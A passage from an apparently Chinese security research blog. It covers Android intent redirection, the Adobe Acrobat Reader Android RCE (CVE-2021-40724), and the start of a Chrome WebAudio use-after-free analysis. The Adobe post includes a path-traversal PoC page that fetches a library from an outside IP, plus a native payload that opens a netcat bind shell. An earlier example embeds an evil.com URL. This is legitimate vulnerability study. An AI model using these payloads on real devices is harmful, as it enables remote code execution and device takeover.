<li>嵌入的Parcelable和Serializable对象不能被转换为字符串（它们将被忽略）</li>
<li><code>Intent.FLAG_GRANT_READ_URI_PERMISSION</code>和<code>Intent.FLAG_GRANT_WRITE_URI_PERMISSION</code>的不安全标志在调用<code>Intent.parseUri(...)</code>时被忽略。只有当<code>Intent.URI_ALLOW_UNSAFE(startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))</code>标志被设置时，解析器才会留下它们，这非常罕见</li>
</ul>
<p>许多开发人员仍然忘记对通过 WebView 接收到的意图进行完整过滤：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, WebResourceRequest request)</span> &#123;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> request.getUrl();</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;intent&quot;</span>.equals(uri.getScheme())) &#123;</span><br><span class="line">    	<span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);</span><br><span class="line">    	intent.addCategory(<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>);</span><br><span class="line">    	intent.setComponent(<span class="literal">null</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, request);</span><br></pre></td></tr></table></figure>

<p>攻击者可以通过选择器指定一个未导出的组件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setSelector(<span class="keyword">new</span> <span class="title class_">Intent</span>().setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.AuthWebViewActivity&quot;</span>));</span><br><span class="line">intent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://evil.com/&quot;</span>);</span><br><span class="line">Log.d(<span class="string">&quot;evil&quot;</span>, intent.toUri(Intent.URI_INTENT_SCHEME)); <span class="comment">// &quot;intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end&quot;</span></span><br></pre></td></tr></table></figure>

<p>并绕过应用程序对Intent的保护。因此，我们建议也过滤选择器：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">intent.addCategory(<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>);</span><br><span class="line">intent.setComponent(<span class="literal">null</span>);</span><br><span class="line">intent.setSelector(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>但即使完全过滤也不能保证完全保护，因为攻击者可以创建与<code>intent-filter</code>某些未导出activity相对应的隐式意图。活动声明示例：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.AuthWebViewActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;victim&quot;</span> <span class="attr">android:host</span>=<span class="string">&quot;secure_handler&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webView.loadUrl(getIntent().getData().getQueryParameter(<span class="string">&quot;url&quot;</span>), getAuthHeaders());</span><br></pre></td></tr></table></figure>

<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>一些应用程序开发人员实现自己的<code>intent-filter</code>（通常用于处理deeplink或推送消息），使用例如 JSON 对象、字符串或字节数组，它们要么与默认值没有区别，要么存在很大的危险，因为它们可能会扩展对象<code>Serializable</code>和<code>Parcelable</code>，还允许设置不安全的标志。安全研究人员还可能会遇到更奇特的Intent创建，例如将字节数组转换为一个 <code>Parcel</code>，然后从中读取Intent。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">deeplinkUri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line"><span class="keyword">if</span>(deeplinkUri.toString().startsWith(<span class="string">&quot;deeplink://handle/&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">byte</span>[] handle = Base64.decode(deeplinkUri.getQueryParameter(<span class="string">&quot;param&quot;</span>), <span class="number">0</span>);</span><br><span class="line">    <span class="type">Parcel</span> <span class="variable">parcel</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">    parcel.unmarshall(handle, <span class="number">0</span>, handle.length);</span><br><span class="line">    startActivity((Intent) parcel.readParcelable(getClassLoader()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-01-18T12:35:45.000Z" title="2022/1/18 20:35:45">2022-01-18</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-01-24T13:27:54.035Z" title="2022/1/24 21:27:54">2022-01-24</time></span><span class="level-item">6 minutes read (About 935 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/01/18/Android-Adobe-Acrobat-Reader-RCE-CVE-2021-40724/">Android Adobe Acrobat Reader RCE(CVE-2021-40724)</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很久没有看android的漏洞了，正好最近看看这个，学习一下思路。</p>
<blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://hulkvision.github.io/blog/post1/">https://hulkvision.github.io/blog/post1/</a></p>
</blockquote>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>应用程序包含一个intent-filter，可以接受带有URL的intent，mime为application&#x2F;pdf，当收到这样的intent时，应用程序会将pdf文件下载到Downloads目录中。问题在于这个URL可以导致路径穿越。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme_Virgo_SplashScreen&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.adobe.reader.AdobeReader&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:launchMode</span>=<span class="string">&quot;singleTask&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;user&quot;</span> <span class="attr">android:configChanges</span>=<span class="string">&quot;keyboardHidden|screenLayout|screenSize|smallestScreenSize&quot;</span> <span class="attr">android:noHistory</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:resizeableActivity</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">......</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.EDIT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;file&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;content&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;http&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:mimeType</span>=<span class="string">&quot;application/pdf&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p><code>com.adobe.reader.AdobeReader</code>接收到 Intent 并启动<code>ARFileURLDownloadActivity</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleIntent</span><span class="params">()</span> &#123;</span><br><span class="line">......</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, ARFileURLDownloadActivity.class);</span><br><span class="line">    intent2.putExtra(ARFileTransferActivity.FILE_PATH_KEY, intent.getData());</span><br><span class="line">    intent2.putExtra(ARFileTransferActivity.FILE_MIME_TYPE, intent.getType());</span><br><span class="line">    startActivity(intent2);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ARFileURLDownloadActivity</code>启动<code>com.adobe.reader.misc.ARFileURLDownloadService</code>服务。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMAMCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onMAMCreate(bundle);</span><br><span class="line">    <span class="built_in">this</span>.mServiceIntent = <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, ARFileURLDownloadService.class);</span><br><span class="line">    <span class="type">Bundle</span> <span class="variable">bundle2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">    <span class="comment">//...//</span></span><br><span class="line">    <span class="built_in">this</span>.mServiceIntent.putExtras(bundle2);</span><br><span class="line">    startService();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>com.adobe.reader.misc.ARFileURLDownloadService.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onMAMStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123; </span><br><span class="line">    <span class="type">Bundle</span> <span class="variable">extras</span> <span class="operator">=</span> intent.getExtras();</span><br><span class="line">    <span class="comment">//..//</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> extras.getString(ARFileTransferActivity.FILE_MIME_TYPE, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">ARURLFileDownloadAsyncTask</span> <span class="variable">aRURLFileDownloadAsyncTask</span> <span class="operator">=</span> <span class="keyword">new</span>    <span class="title class_">ARURLFileDownloadAsyncTask</span>(ARApp.getInstance(), (Uri) extras.getParcelable(ARFileTransferActivity.FILE_PATH_KEY), (String) extras.getCharSequence(ARFileTransferActivity.FILE_ID_KEY), <span class="literal">true</span>, string);</span><br><span class="line">    <span class="built_in">this</span>.mURLFileDownloadAsyncTask = aRURLFileDownloadAsyncTask;</span><br><span class="line">    aRURLFileDownloadAsyncTask.taskExecute(<span class="keyword">new</span> <span class="title class_">Void</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>com.adobe.reader.misc.ARURLFileDownloadAsyncTask.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">downloadFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException, SVFileDownloadException &#123;</span><br><span class="line">    Exception exc;</span><br><span class="line">    <span class="type">boolean</span> z;</span><br><span class="line">    Throwable th;</span><br><span class="line">    <span class="type">boolean</span> z2;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">fileURI</span> <span class="operator">=</span> <span class="built_in">this</span>.mDownloadModel.getFileURI();</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(fileURI.toString());</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">downloadFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ARFileFromURLDownloader</span>(<span class="keyword">new</span> <span class="title class_">ARFileFromURLDownloader</span>.DownloadUrlListener() &#123;</span><br><span class="line">           ARFileFromURLDownloader.DownloadUrlListener</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onProgressUpdate</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">                ARURLFileDownloadAsyncTask.<span class="built_in">this</span>.broadcastUpdate(<span class="number">0</span>, i, i2);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// com.adobe.reader.misc.ARFileFromURLDownloader.DownloadUrlListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldCancelDownload</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> ARURLFileDownloadAsyncTask.<span class="built_in">this</span>.isCancelled();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;).downloadFile(BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData(fileURI.getLastPathSegment(), <span class="built_in">this</span>.mDownloadModel.getMimeType(), <span class="literal">null</span>, fileURI), url);</span><br><span class="line"><span class="comment">//...//</span></span><br></pre></td></tr></table></figure>

<p><code>BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData</code>将 <code>this.mUri.getLastPathSegment()</code> 作为参数，并返回 url 路径中解码的最后一段。</p>
<p>例如url <code>https://localhost/x/..%2F..%2Ffile.pdf</code>，当这个 url 被传递给 getLastPathSegment() 方法时，它将<code>..%2F..%2Ffile.pdf</code>作为 url 的最后一段并以<code>../../file.pdf</code>作为输出返回。</p>
<p>在将变量传递给 File 实例之前没有对变量执行任何清理，<code>downloadFile</code>将导致路径穿越漏洞。</p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>Adobe Acrobat Reader 应用程序使用 Google play 核心库为其用户提供额外的功能。</p>
<blockquote>
<p>可以通过检查<code>/data/data/:application_id/files/</code>目录中的<code>spiltcompat</code>目录来判断应用程序是否使用 play 核心库进行动态代码加载。</p>
</blockquote>
<p>没看见有这个目录。</p>
<p>作者说他可以在应用程序<code>/data/data/com.adobe.reader/files/splitcompat/1921618197/verified-splits/</code>目录中释放任意APK，并且，这个APK中的类，还可以自动添加到应用程序的ClassLoader中，具体参考<a target="_blank" rel="noopener" href="https://blog.oversecured.com/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/%E3%80%82">https://blog.oversecured.com/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/。</a></p>
<p>经过分析，使用Google play core library的应用程序，支持从<code>/data/data/com.adobe.reader/files/splitcompat/:id/native-libraries/</code>目录中加载so文件。</p>
<p>Adobe Acrobat Reader 的模块Adobe Acrobat Reader 也会从该目录中加载so文件，通过逆向分析这个模块，发现这个模块会加载三个库：<code>libADCComponent.so</code>，<code>libColoradoMobile.so</code> 和 <code>libopencv_info.so</code>。通过这三个库可以实现代码执行。</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>能路径穿越，能下载成功，但是so文件会显示错误，然后自动删除。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span> RCE in Adobe Acrobat Reader for android <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;intent://34.127.85.178/x/x/x/x/x/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.adobe.reader%2Ffiles%2Fsplitcompat%2F1921819312%2Fnative-libraries%2FFASOpenCVDF.config.arm64_v8a%2Flibopencv_info.so#Intent;scheme=http;type=application/*;package=com.adobe.reader;component=com.adobe.reader/.AdobeReader;end&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;jni.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint <span class="title function_">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="keyword">void</span>* reserved)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        system(<span class="string">&quot;toybox nc -p 6666 -L /system/bin/sh -l&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    JNIEnv* env;</span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;GetEnv(reinterpret_cast&lt;<span class="keyword">void</span>**&gt;(&amp;env), JNI_VERSION_1_6) != JNI_OK) &#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>com.adobe.libs.buildingblocks.utils.BBIntentUtils.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_NAME_RESERVED_CHARACTER</span> <span class="operator">=</span> <span class="string">&quot;[*/\\|?&lt;&gt;\&quot;]&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getModifiedFileNameWithExtensionUsingIntentData</span><span class="params">(String str, String str2, ContentResolver contentResolver, Uri uri)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (TextUtils.isEmpty(str)) &#123;</span><br><span class="line">            str = BBConstants.DOWNLOAD_FILE_NAME;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (!(contentResolver == <span class="literal">null</span> || uri == <span class="literal">null</span>)) &#123;</span><br><span class="line">            str3 = MAMContentResolverManagement.getType(contentResolver, uri);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> !TextUtils.isEmpty(str3) ? str3 : str2;</span><br><span class="line">        <span class="keyword">if</span> (!TextUtils.isEmpty(str4)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileExtensionFromMimeType</span> <span class="operator">=</span> BBFileUtils.getFileExtensionFromMimeType(str4);</span><br><span class="line">            <span class="keyword">if</span> (!TextUtils.isEmpty(fileExtensionFromMimeType)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (str.lastIndexOf(<span class="number">46</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">                    str = str + <span class="string">&#x27;.&#x27;</span> + fileExtensionFromMimeType;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">mimeTypeForFile</span> <span class="operator">=</span> BBFileUtils.getMimeTypeForFile(str);</span><br><span class="line">                    <span class="keyword">if</span> (TextUtils.isEmpty(mimeTypeForFile) || (!TextUtils.equals(mimeTypeForFile, str3) &amp;&amp; !TextUtils.equals(mimeTypeForFile, str2))) &#123;</span><br><span class="line">                        str = str + <span class="string">&#x27;.&#x27;</span> + fileExtensionFromMimeType;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str.replaceAll(FILE_NAME_RESERVED_CHARACTER, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-12-02T10:58:56.000Z" title="2021/12/2 18:58:56">2021-12-02</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-12-12T09:51:28.740Z" title="2021/12/12 17:51:28">2021-12-12</time></span><span class="level-item">an hour read (About 7267 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/12/02/CVE-2020-15972-Chrome%E6%B5%8F%E8%A7%88%E5%99%A8RCE/">CVE-2020-15972 Chrome浏览器RCE</a></p><div class="content"><p>漏洞原因</p>
<p>Chrome 的 WebAudio 组件中的UAF</p>
<p>影响范围</p>
<p>该错误已在 10 月份的 Chrome <a target="_blank" rel="noopener" href="https://chromereleases.googleblog.com/2020/10/stable-channel-update-for-desktop.html">86.0.4240.75</a>版中<a target="_blank" rel="noopener" href="https://chromereleases.googleblog.com/2020/10/stable-channel-update-for-desktop.html">修复</a>。影响了 Chrome 85 稳定版的大部分。</p>
<blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_renderer/">https://securitylab.github.com/research/one_day_short_of_a_fullchain_renderer/</a></p>
</blockquote>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>以前，网页对于音频的处理仅限于<code>&lt;audio&gt;</code>标签，能力十分有限，为了实现更高级的操作，W3C设计实现了WebAudio API，通过这些API，我们几乎可以完成一个专业的音频处理软件的构建。</p>
<p>WebAudio API可以实现：</p>
<ul>
<li>实现高精度的音频计算。</li>
<li>音频混响器。</li>
<li>3D音频。</li>
<li>与<code>&lt;audio&gt;/WebRTC</code>的集成。</li>
</ul>
<p>设计思路：类似于标准IO函数，从某个地方（input）读取一个音频流，经过实时计算处理后发送去某个地方（destination），这个处理过程是effect。</p>
<p><img src="https://mdn.mozillademos.org/files/12241/webaudioAPI_en.svg"></p>
<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>由于音频处理是一项计算密集型任务，它将在单独的音频线程上完成，以便不阻塞浏览器的响应。WebAudio中的音频输入以128帧为单位进行处理，称为quantum。一旦一个quantum开始处理，整个quantum就必须完成，这意味着所有的节点都必须处理这128帧，即使有些节点被主线程删除和收集垃圾。</p>
<p>在下面的情况中，convolver实际上不会被删除，因为每个节点都持有对它所连接的输出节点的引用。然而，如果我们断开节点的连接，则convolver可能会被删除，但音频图仍然在被处理。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> soundSource1 = audioContext.<span class="title function_">createConstantSource</span>();</span><br><span class="line"><span class="keyword">let</span> convolver = audioContext.<span class="title function_">createConvolver</span>();</span><br><span class="line">soundSource1.<span class="title function_">connect</span>(convolver).<span class="title function_">connect</span>(audioContext.<span class="property">destination</span>);</span><br><span class="line">audioContext.<span class="title function_">startRendering</span>();       <span class="comment">//&lt;-------- start processing the audio graph</span></span><br><span class="line">soundSource1.<span class="title function_">disconnect</span>();</span><br><span class="line">convolver = <span class="literal">null</span>;</span><br><span class="line"><span class="title function_">gc</span>();</span><br></pre></td></tr></table></figure>

<p>那么一个死去的节点如何继续处理音频数据呢？在WebAudio中，AudioNode实际上只是javascript的一个接口，实际的处理是由它拥有的AudioHandler处理的。当一个AudioNode被销毁时，它将使用IsPullingAudioGraph函数检查此刻是否正在处理一个quantum。</p>
